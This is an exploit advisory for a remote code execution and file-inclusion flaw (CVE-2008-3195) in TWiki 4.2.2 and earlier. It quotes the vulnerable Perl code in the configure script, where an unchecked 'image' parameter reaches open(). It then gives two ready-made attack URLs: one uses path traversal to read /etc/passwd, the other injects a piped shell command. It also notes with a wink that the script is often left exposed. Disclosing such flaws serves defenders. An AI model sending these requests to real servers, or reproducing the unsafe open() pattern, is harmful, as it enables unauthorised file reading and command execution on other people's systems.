TWiki <= 4.2.2 (action) Remote Code Execution Vulnerability
===========================================================


#-----------TWiki Remote Code Execution <= 4.2.2--------------------#

# ----------CVE Id(s)      : CVE-2008-3195--------------------------#

# http://twiki.org/cgi-bin/view/Codev/DownloadTWiki#4_2_3_Bugfix_Highlights

The "configure" file in TWiki&#039;s bin folder is vulnerable to code execution and local file inclusion.

According to TWiki&#039;s documentation this file is meant to be protected with .htaccess, but many a times you find it is not ;)

Vulnerable code:

if( $action eq &#039;image&#039; ) {
    # SMELL: this call is correct, but causes a perl error

    # on some versions of CGI.pm
    # print $query->header(-type => $query->param(&#039;type&#039;));
    # So use this instead:
    print &#039;Content-type: &#039;.$query->param(&#039;type&#039;)."\n\n";

    if( open(F, &#039;logos/&#039;.$query->param(&#039;image&#039; ))) {
        local $/ = undef;
        print <F>;
        close(F);
    }

http://localhost/twiki/bin/configure?action=image;image=../../../../../../../etc/passwd;type=text/plain

http://localhost/twiki/bin/configure?action=image;image=|uname -a|;type=text/plain



